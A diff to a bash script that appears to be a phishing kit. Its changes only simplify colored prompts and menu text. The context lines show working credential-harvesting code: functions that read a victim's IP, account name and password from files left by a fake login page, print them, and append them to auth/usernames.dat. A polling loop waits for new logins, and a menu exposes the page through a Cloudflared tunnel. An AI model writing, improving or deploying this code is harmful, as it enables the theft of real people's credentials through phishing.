@@ -364,7 +364,7 @@ about() {
 ## Choose custom port
 cusport() {
 	echo
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	read -n1 -p "${RED} Do You Want A Custom Port: ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
 		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port[1024-9999]: ${WHITE}" CU_P
@@ -393,8 +393,8 @@ setup_site() {
 capture_ip() {
     victim_ip=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
     IFS=$'\n'
-    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP: ${BLUE}$victim_ip"
-    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in: ${ORANGE}auth/ip.txt"
+    echo -e "\n${GREEN} Victim's IP: ${BLUE}$victim_ip"
+    echo -ne "\n${BLUE} Saved in: ${ORANGE}auth/ip.txt"
     cat .server/www/ip.txt >> auth/ip.txt
 }
 
@@ -412,10 +412,10 @@ capture_creds() {
     
     IFS=$'\n'
     # Print info to console
-    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP: ${BLUE}$victim_ip"
-    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account: ${BLUE}$ACCOUNT"
-    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password: ${BLUE}$PASSWORD"
-    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in: ${ORANGE}auth/usernames.dat"
+    echo -e "\n${GREEN} Victim IP: ${BLUE}$victim_ip"
+    echo -e "\n${GREEN} Account: ${BLUE}$ACCOUNT"
+    echo -e "\n${GREEN} Password: ${BLUE}$PASSWORD"
+    echo -e "\n${BLUE} Saved in: ${ORANGE}auth/usernames.dat"
     
     # Save IP and credentials to file
     echo "Victim IP: $victim_ip" >> auth/usernames.dat
@@ -430,13 +430,13 @@ capture_data() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			echo -e "\n\n${GREEN} Victim IP Found !"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			echo -e "\n\n${GREEN} Login info Found !!"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
@@ -518,9 +518,9 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${MAGENTA}[${CYAN}00${MAGENTA}]${ORANGE} Main Menu
-		${MAGENTA}[${CYAN}01${MAGENTA}]${ORANGE} Localhost
-		${MAGENTA}[${CYAN}02${MAGENTA}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
+		${WHITE} 0. Main Menu
+		${WHITE} 1. Localhost
+		${WHITE} 2. Cloudflared
 
 	EOF
 
@@ -535,7 +535,7 @@ tunnel_menu() {
 		2 | 02)
 			start_cloudflared;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
 	esac
 }
